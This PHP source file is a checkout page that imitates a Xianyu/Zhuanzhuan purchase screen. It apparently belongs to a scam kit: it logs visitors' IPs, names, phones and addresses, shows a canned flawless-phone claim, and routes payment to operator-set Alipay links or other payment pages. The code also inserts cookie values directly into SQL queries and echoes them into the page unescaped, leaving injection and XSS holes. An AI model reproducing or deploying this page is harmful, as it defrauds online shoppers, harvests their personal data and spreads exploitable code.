<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');
$ip=getIP();
setcookie('GoodsID4',$_COOKIE['GoodsID3']);
//写入订单号
setcookie('orderid',$zhuanzhuanORDER);
$xzshijian=date('Y-m-d H:i:s', time());

if($_COOKIE['GoodsID3']){
	

	    $cookTel=substr_replace($_COOKIE['se_tel'],'****',3,4);

	
	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_COOKIE['GoodsID3']}'") or die('SQL执行错误');
	
		//判断操作记录数据是否存在，存在就更新此数据状态为2订单页和时间
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE uip='{$ip}' AND gid='{$_COOKIE['GoodsID3']}'");
	if($_OID){
		_query("
			UPDATE 
				useraddress
			SET 
				state=2,
				utime='{$xzshijian}'
			WHERE 
				uip='{$ip}'AND gid='{$_COOKIE['GoodsID3']}' LIMIT 1") or die(mysql_error());
				
				
		if($_COOKIE['se_name']){
			if($_OID){
			  _query("
				  UPDATE 
					  useraddress
				  SET 
					  uadd='{$_COOKIE['se_address']}',
					  utel='{$_COOKIE['se_tel']}',
					  uname='{$_COOKIE['se_name']}',
					  orderid='{$zhuanzhuanORDER}',
					  state=2
				  WHERE 
					  uip='{$ip}'AND gid='{$_COOKIE['GoodsID3']}' LIMIT 1");
				
			}
		}	
		  _close();
		  session_destroy();
		  
	}

}
if($_COOKIE['GoodsURL1_1']){
    if(!$_COOKIE['GoodsID3']){
       header('Location:'. htmlspecialchars_decode($_COOKIE['GoodsURL1_1']).'');
    }
}else{
    header('Location:'. htmlspecialchars_decode($Class1_jump_url).'');
}

if($_GoodsID['jianyanji']==1)
$jianyanji888=$_GoodsID['yanjifeiyong'];
if($_GoodsID['jianyanji']==0)
$jianyanji888=0;

if($_GoodsID['qcyanji']==1){
$qcyanji888="style='display:none'";
$qcyanji666="2";}
if($_GoodsID['qcyanji']==2){
$qcyanji777="style='display:none'";
$qcyanji666="";
$qcyanji555="-国行全国联保，无拆无修，无进水，无暗病，无任何划痕磕碰，一直贴膜带壳使用，国行三网通，配件齐全，支持转转验机。";}

$zhifufangshi=$_GoodsID['pay_fangshi'];
if($zhifufangshi==2){
$fangshi=$_GoodsID['zhifubaoURL']."&my=".$_GoodsID['price'];}
if($zhifufangshi==1){
$fangshi="go.php";}
if($zhifufangshi==3){
$fangshi="payment_jd.php";}
if($zhifufangshi==4){
$fangshi="payment_tu.php";}

$IsWriteAddress==1;

?>
<!DOCTYPE html>
<!-- saved from url=(0000)http://order.php -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="format-detection" content="telephone=no">
	<title>购买宝贝</title>
	<link rel="stylesheet" href="./image/index.css">
    <style type="text/css">
        .alertShadeLayer { display: none; height: 100%; width: 100%; position: fixed; z-index: 9999; top: 0; }
    </style>

</head>
<body>
	
	<div class="app">
		<div class="head">
			<div class="head-xiao">
				<div>
					<a onClick="window.history.go(-1)">
						<img src="./image/prev.png---_" alt="">
					</a>
				</div>
				<div>购买宝贝</div>
				<div></div>
			</div>
		</div>
		
		<div class="gouA">
			<div class="gouA-top">
				<div class="gouA-top-left"><img src="<?php echo $_GoodsID['goods_img1'] ?>" style="height:100px;  border-radius: 20px;" alt=""></div>
				<div class="gouA-top-right">
					<p class="diyi"><?php echo $_GoodsID['title']; ?></p>
					<img  onclick="location.href='https://market.m.taobao.com/app/idleFish-F2e/fish-appraise/pages/readme/index.html?ut_sk=1.YPvlgcNC4OMDAKMRUEgXOh3J_12431167_1642100332483.Copy.activity.https://market.m.taobao.com/app/idleFish-F2e/fish-appraise/pages/readme/index.html?aimTag=YHB_PHONE&showBtn=true&spm=a2170.7898010.clickexamineservice.1.2211603909106';"      src="./image/yhb2.jpg" style="height:14px;margin-top:px;">
					<p class="dier">￥<?php echo $_GoodsID['price']; ?></p>
				</div>
			</div>
		</div>
		<div class="gouB">
			<a href="address.php?gid=<?php echo $_GoodsID['goods_id']; ?>">
				<div class="gouB_a">
					<div class="gouB_a-left">
						收货地址
					</div>
					<div class="gouB_a-right">
						<div>
                <?php
				$sname=$_COOKIE['se_name'];
				$smobil=$_COOKIE['se_tel'];
				$address_province=$_COOKIE['se_region'];
				$address_detail=$_COOKIE['se_address'];
				$custUa=$_COOKIE['se_custUa'];
				if($smobil == "") {
				$dizhi888="0";
				echo "<p>新增地址</p>";}
				if($smobil <> "") {
				$dizhi888="1";
				echo
				"<p>$sname $smobil</p><p>$custUa $address_province $address_detail</p>";
				}
				?>
<script>
          function mal(){
            
if (<?php echo $dizhi888; ?> == 0) {
        alert('请填写收货地址');
} else {
                    //$("#alert1").show().delay(2000).fadeOut();
					window.location.href="<?php echo $fangshi; ?>";
}

 };
</script>
						</div>
						<div><img src="./image/next.png" alt=""></div>
					</div>
				</div>
			</a>
			<div class="gouB_b">
				<div class="gouB_b-top">
					<div>运费</div>
					<div class="hong">￥0.00</div>
				</div>
			</div>
		</div>

			<div class="aui-slide-wrap">
          						<div class="aui-slide-node aui-slide-node-middle aui-slide-node-center">
                  <img  onclick="location.href='https://market.m.taobao.com/app/idleFish-F2e/fish-appraise/pages/readme/index.html?ut_sk=1.YPvlgcNC4OMDAKMRUEgXOh3J_12431167_1642100332483.Copy.activity.https://market.m.taobao.com/app/idleFish-F2e/fish-appraise/pages/readme/index.html?aimTag=YHB_PHONE&showBtn=true&spm=a2170.7898010.clickexamineservice.1.2211603909106';"     src="./image/yhb3.jpg" style="width: 100%;height:100%;margin-top: 4%;margin-left: px; border-radius: 10px;" alt=""></div>			<div class="gouC_d">
				<p>
					提交订单表示同意<span>《闲鱼验货担保协议》</span>

				</p>
			</div>
		</div>
		<div class="gouD">
		</div>
	</div>
	<div class="foot">
			<div class="foot-left">
				实付款
				<span class="hong">￥<?php echo $_GoodsID['price']; ?></span>
			</div>
              <input name="IsWriteAddress" id="IsWriteAddress" type="hidden" value=0 />
			<div class="foot-right">
			<div onclick="mal()">确定</div>
			</div>
		</div>


    <div id="alert1" class="alertShadeLayer">
        <div class="msg">请填写收货地址</div>
    </div>
</body></html>